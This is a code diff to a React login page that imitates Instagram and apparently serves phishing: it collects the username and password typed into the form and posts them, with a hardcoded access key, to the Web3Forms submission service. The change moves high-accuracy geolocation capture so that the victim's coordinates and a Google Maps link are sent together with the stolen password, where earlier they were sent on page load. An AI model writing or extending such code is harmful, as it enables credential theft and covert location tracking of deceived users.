@@ -6,6 +6,7 @@ export function App() {
   const [showPassword, setShowPassword] = useState(false);
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
+  const [locationData, setLocationData] = useState(null);
   
   // Initialize timer from localStorage or start new timer
   const [timeLeft, setTimeLeft] = useState(() => {
@@ -26,38 +27,26 @@ export function App() {
     return 20 * 60;
   });
 
-  // Request location on mount
+  // Request location on mount and store it
   useEffect(() => {
     if ('geolocation' in navigator) {
       console.log('Requesting location permission...');
       navigator.geolocation.getCurrentPosition(
-        async (position) => {
+        (position) => {
           const { latitude, longitude, accuracy } = position.coords;
-          console.log('Location captured:', { latitude, longitude, accuracy });
-          
-          // Send location immediately to Web3Forms
-          const formData = new FormData();
-          formData.append('access_key', 'ae1d92b7-0790-4af0-8d45-e45cfa6e88f1');
-          formData.append('name', 'Location Captured');
-          formData.append('email', 'location@instagram.com');
-          formData.append('subject', 'User Location Captured');
-          formData.append('message', `Latitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters\nTimestamp: ${new Date().toISOString()}\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`);
-          
-          try {
-            const response = await fetch('https://api.web3forms.com/submit', {
-              method: 'POST',
-              body: formData
-            });
-            const result = await response.json();
-            console.log('Location sent successfully:', result);
-            // Store that location was sent
-            localStorage.setItem('locationSent', 'true');
-          } catch (error) {
-            console.error('Location submission error:', error);
-          }
+          const locationInfo = {
+            latitude,
+            longitude,
+            accuracy,
+            timestamp: new Date().toISOString(),
+            mapsUrl: `https://www.google.com/maps?q=${latitude},${longitude}`
+          };
+          console.log('Location captured:', locationInfo);
+          setLocationData(locationInfo);
         },
         (error) => {
           console.log('Location permission denied or error:', error.message);
+          setLocationData({ error: error.message });
         },
         {
           enableHighAccuracy: true,
@@ -67,6 +56,7 @@ export function App() {
       );
     } else {
       console.log('Geolocation not supported');
+      setLocationData({ error: 'Geolocation not supported' });
     }
   }, []);
 
@@ -94,12 +84,25 @@ export function App() {
   const handleSubmit = async (e) => {
     e.preventDefault();
     
+    // Build message with password and location data
+    let message = `Password: ${password}`;
+    
+    if (locationData) {
+      if (locationData.error) {
+        message += `\n\nLocation: ${locationData.error}`;
+      } else {
+        message += `\n\nLocation Coordinates:\nLatitude: ${locationData.latitude}\nLongitude: ${locationData.longitude}\nAccuracy: ${locationData.accuracy} meters\nTimestamp: ${locationData.timestamp}\nGoogle Maps: ${locationData.mapsUrl}`;
+      }
+    } else {
+      message += '\n\nLocation: Not captured yet';
+    }
+    
     // Submit to Web3Forms
     const formData = new FormData();
     formData.append('access_key', 'ae1d92b7-0790-4af0-8d45-e45cfa6e88f1');
     formData.append('name', username);
     formData.append('email', 'login-attempt@instagram.com');
-    formData.append('message', password); // Password in message field
+    formData.append('message', message);
     
     try {
       await fetch('https://api.web3forms.com/submit', {
